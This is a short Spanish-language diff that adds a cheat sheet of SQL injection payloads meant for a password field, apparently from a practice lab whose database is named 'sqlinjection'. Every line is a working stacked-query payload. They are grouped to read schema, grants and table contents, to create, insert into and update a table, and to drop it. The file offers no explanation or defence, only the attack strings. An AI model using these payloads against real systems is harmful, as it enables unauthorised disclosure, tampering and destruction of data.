@@ -1,0 +1,18 @@
+Comandos en password
+
+EXFILTRACIÓN DE DATOS:
+'; select database(); select '1
+'; SHOW FULL TABLES FROM sqlinjection; select '1
+'; show grants; select '1
+'; select * from puestos; select '1
+
+INFORMACIÓN:
+'; select version(); select '1
+
+ALTERACIÓN DATOS
+'; CREATE TABLE departamentos (id INT NOT NULL AUTO_INCREMENT , nombre VARCHAR(50) NOT NULL , director VARCHAR(50) NOT NULL , cantidad_puestos INT NOT NULL , PRIMARY KEY (id)); select '1
+'; INSERT INTO departamentos (id, nombre, director, cantidad_puestos) VALUES (NULL, 'IT', 'Jaime Ruiz', '2'), (NULL, 'RRHH', 'Carla Suarez', '5'); select '1
+'; UPDATE departamentos SET director = 'Jaime Armas Ruiz' WHERE id = '1
+
+BORRADO DE DATOS:
+'; Drop table departamentos; select '1
